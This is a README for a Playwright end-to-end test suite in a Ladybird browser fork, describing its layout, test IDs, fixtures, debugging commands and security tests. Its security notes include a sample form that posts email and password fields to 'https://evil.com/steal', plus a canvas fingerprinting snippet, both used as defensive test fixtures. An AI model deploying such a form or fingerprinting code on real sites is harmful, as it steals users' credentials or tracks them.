# Playwright E2E Tests for Ladybird Browser

This directory contains end-to-end (E2E) automated tests for Ladybird browser using Playwright.

## Quick Start

### Prerequisites

- Node.js 18+ installed
- Ladybird browser built (`./Meta/ladybird.py build`)
- Sentinel service available (for security tests)

### Installation

```bash
cd /home/rbsmith4/ladybird/Tests/Playwright
npm install
npx playwright install chromium  # Install browser for test runner
```

### Running Tests

```bash
# Run all tests
npm test

# Run specific priority level
npm run test:p0   # Critical tests only
npm run test:p1   # Important tests
npm run test:p2   # Nice-to-have tests

# Run specific test file
npx playwright test tests/core-browser/navigation.spec.ts

# Run with UI mode (debugging)
npx playwright test --ui

# Run specific test by name
npx playwright test -g "NAV-001"

# Generate HTML report
npx playwright show-report
```

## Test Structure

```
Tests/Playwright/
├── README.md                    # This file
├── TEST_MATRIX.md               # Complete test matrix specification
├── package.json                 # Node.js dependencies
├── playwright.config.ts         # Playwright configuration
├── tests/
│   ├── core-browser/
│   │   ├── navigation.spec.ts       # Navigation tests (NAV-*)
│   │   ├── tabs.spec.ts             # Tab management (TAB-*)
│   │   ├── history.spec.ts          # History tests (HIST-*)
│   │   ├── bookmarks.spec.ts        # Bookmark tests (BOOK-*)
│   │   └── settings.spec.ts         # Settings tests (SET-*)
│   ├── page-rendering/
│   │   ├── html.spec.ts             # HTML rendering (HTML-*)
│   │   ├── css.spec.ts              # CSS layout (CSS-*)
│   │   ├── javascript.spec.ts       # JavaScript execution (JS-*)
│   │   ├── fonts.spec.ts            # Web fonts (FONT-*)
│   │   └── images.spec.ts           # Image rendering (IMG-*)
│   ├── forms/
│   │   ├── input-types.spec.ts      # Form inputs (FORM-*)
│   │   ├── submission.spec.ts       # Form submission (FSUB-*)
│   │   └── validation.spec.ts       # Form validation (FVAL-*)
│   ├── security/                    # FORK-SPECIFIC TESTS
│   │   ├── form-monitor.spec.ts     # FormMonitor (FMON-*)
│   │   ├── malware.spec.ts          # Malware detection (MAL-*)
│   │   ├── phishing.spec.ts         # Phishing detection (PHISH-*)
│   │   ├── fingerprinting.spec.ts   # Fingerprinting (FP-*)
│   │   └── policy-graph.spec.ts     # PolicyGraph (PG-*)
│   ├── multimedia/
│   │   ├── video.spec.ts            # HTML5 video (VID-*)
│   │   ├── audio.spec.ts            # HTML5 audio (AUD-*)
│   │   └── canvas.spec.ts           # Canvas 2D (CVS-*)
│   ├── network/
│   │   ├── http.spec.ts             # HTTP/HTTPS (NET-*)
│   │   ├── resources.spec.ts        # Resource loading (RES-*)
│   │   ├── downloads.spec.ts        # Download handling (DL-*)
│   │   └── errors.spec.ts           # Error handling (ERR-*)
│   ├── accessibility/
│   │   ├── aria.spec.ts             # ARIA attributes (A11Y-*)
│   │   ├── keyboard.spec.ts         # Keyboard nav (KBD-*)
│   │   └── focus.spec.ts            # Focus management (FOC-*)
│   ├── performance/
│   │   ├── page-load.spec.ts        # Page metrics (PERF-*)
│   │   ├── resources.spec.ts        # Resource perf (RPERF-*)
│   │   └── memory.spec.ts           # Memory/rendering (MEM-*)
│   └── edge-cases/
│       ├── large-pages.spec.ts      # Large pages (EDGE-*)
│       ├── concurrent.spec.ts       # Concurrent ops (CONC-*)
│       ├── network-failures.spec.ts # Network failures (NETF-*)
│       └── invalid-input.spec.ts    # Invalid input (INV-*)
├── fixtures/
│   ├── ladybird-fixtures.ts     # Custom Playwright fixtures
│   ├── policy-graph-helper.ts   # PolicyGraph test utilities
│   └── sentinel-client.ts       # Sentinel IPC client
├── test-pages/                  # Test HTML pages
│   ├── fingerprinting/
│   │   ├── canvas-aggressive.html
│   │   ├── webgl-fingerprint.html
│   │   └── audio-fingerprint.html
│   ├── forms/
│   │   ├── cross-origin-form.html
│   │   ├── insecure-form.html
│   │   └── autofill-test.html
│   └── phishing/
│       ├── homograph-attack.html
│       └── typosquatting.html
└── playwright-report/           # Generated test reports

```

## Test Naming Convention

All tests follow the ID scheme from TEST_MATRIX.md:

- **NAV-###**: Navigation tests
- **TAB-###**: Tab management tests
- **HIST-###**: History tests
- **BOOK-###**: Bookmark tests
- **SET-###**: Settings tests
- **HTML-###**: HTML rendering tests
- **CSS-###**: CSS layout tests
- **JS-###**: JavaScript execution tests
- **FONT-###**: Web font tests
- **IMG-###**: Image rendering tests
- **FORM-###**: Form input tests
- **FSUB-###**: Form submission tests
- **FVAL-###**: Form validation tests
- **FMON-###**: FormMonitor credential protection (FORK)
- **MAL-###**: Malware detection (FORK)
- **PHISH-###**: Phishing detection (FORK)
- **FP-###**: Fingerprinting detection (FORK)
- **PG-###**: PolicyGraph tests (FORK)
- **VID-###**: HTML5 video tests
- **AUD-###**: HTML5 audio tests
- **CVS-###**: Canvas 2D tests
- **NET-###**: HTTP/HTTPS tests
- **RES-###**: Resource loading tests
- **DL-###**: Download handling tests
- **ERR-###**: Error handling tests
- **A11Y-###**: Accessibility (ARIA) tests
- **KBD-###**: Keyboard navigation tests
- **FOC-###**: Focus management tests
- **PERF-###**: Performance tests
- **RPERF-###**: Resource performance tests
- **MEM-###**: Memory/rendering tests
- **EDGE-###**: Large page edge cases
- **CONC-###**: Concurrent operation tests
- **NETF-###**: Network failure tests
- **INV-###**: Invalid input tests

## Priority Levels

Tests are tagged with priority levels for selective execution:

- **P0**: Critical tests - core browser functionality and security (182 tests)
- **P1**: Important tests - enhanced features and UX (96 tests)
- **P2**: Nice-to-have tests - performance and edge cases (33 tests)

Run by priority:
```bash
npm run test:p0  # Run only P0 critical tests
npm run test:p1  # Run P0 + P1 tests
npm run test:p2  # Run all tests (P0 + P1 + P2)
```

## Custom Fixtures

### PolicyGraph Fixture

Use for tests requiring database interaction:

```typescript
import { test } from '../fixtures/ladybird-fixtures';

test('PG-001: Create security policy', async ({ policyGraph }) => {
  await policyGraph.createPolicy('example.com', 'action.com', 'trust');
  const policy = await policyGraph.getPolicy('example.com', 'action.com');
  expect(policy).toBe('trust');
});
```

### Sentinel Client Fixture

Use for tests requiring Sentinel service:

```typescript
import { test } from '../fixtures/ladybird-fixtures';

test('MAL-001: Download clean file', async ({ sentinel }) => {
  const result = await sentinel.scanFile('/tmp/test.exe');
  expect(result.is_malicious).toBe(false);
});
```

## Test Isolation

Each test is **completely isolated**:

- Fresh browser context per test
- Clean PolicyGraph database per test suite
- No shared state between tests
- Tests can run in parallel

## Debugging Tests

### Interactive Mode

```bash
npx playwright test --ui
```

### Debug Specific Test

```bash
npx playwright test --debug -g "NAV-001"
```

### Headed Mode (See Browser)

```bash
npx playwright test --headed
```

### Slow Motion

```bash
npx playwright test --slow-mo=1000
```

### Trace Viewer

```bash
# Record trace
npx playwright test --trace on

# View trace
npx playwright show-trace trace.zip
```

## CI/CD Integration

Tests run automatically on:
- Push to master branch
- Pull requests
- Nightly builds

See `.github/workflows/playwright-tests.yml` for CI configuration.

## Writing New Tests

### 1. Choose Test Category

Refer to TEST_MATRIX.md to find the appropriate category and test ID.

### 2. Create Test File

Add to appropriate directory:
```typescript
// tests/core-browser/navigation.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Navigation', () => {
  test('NAV-001: URL bar navigation to HTTP site', async ({ page }) => {
    await page.goto('http://example.com');
    await expect(page).toHaveTitle(/Example Domain/);
    await expect(page).toHaveURL('http://example.com/');
  });
});
```

### 3. Tag with Priority

```typescript
test('NAV-001: URL bar navigation', { tag: '@p0' }, async ({ page }) => {
  // test code
});
```

### 4. Add Test Page (if needed)

Create HTML test page in `test-pages/` directory.

### 5. Update TEST_MATRIX.md

Mark test as implemented in the matrix.

## Test Coverage Goals

- **Phase 1 (Weeks 1-8)**: 182 P0 tests
- **Phase 2 (Weeks 9-13)**: 96 P1 tests
- **Phase 3 (Weeks 14-16)**: 33 P2 tests
- **Total**: 311 tests

Current coverage: **0/311 tests implemented** (0%)

## Security Test Notes (Fork-Specific)

### FormMonitor Tests

Require test pages with cross-origin forms:

```html
<!-- test-pages/forms/cross-origin-form.html -->
<form action="https://evil.com/steal" method="POST">
  <input type="email" name="email">
  <input type="password" name="password">
  <button type="submit">Submit</button>
</form>
```

### Fingerprinting Tests

Require aggressive fingerprinting test pages:

```html
<!-- test-pages/fingerprinting/canvas-aggressive.html -->
<script>
  // Canvas fingerprinting
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.fillText('Test', 10, 10);
  const fp = canvas.toDataURL();
</script>
```

### Sentinel Service

Security tests require Sentinel service running:

```bash
./Build/release/bin/Sentinel &
```

Or mock Sentinel service for faster testing.

## Contributing

1. Pick test from TEST_MATRIX.md
2. Implement test following naming convention
3. Ensure test passes locally
4. Tag with correct priority
5. Submit PR with test implementation

## Resources

- [Playwright Documentation](https://playwright.dev/)
- [TEST_MATRIX.md](./TEST_MATRIX.md) - Complete test specification
- [Ladybird Documentation](../../Documentation/)
- [Sentinel Architecture](../../docs/SENTINEL_ARCHITECTURE.md)

## License

BSD 2-Clause (same as Ladybird project)
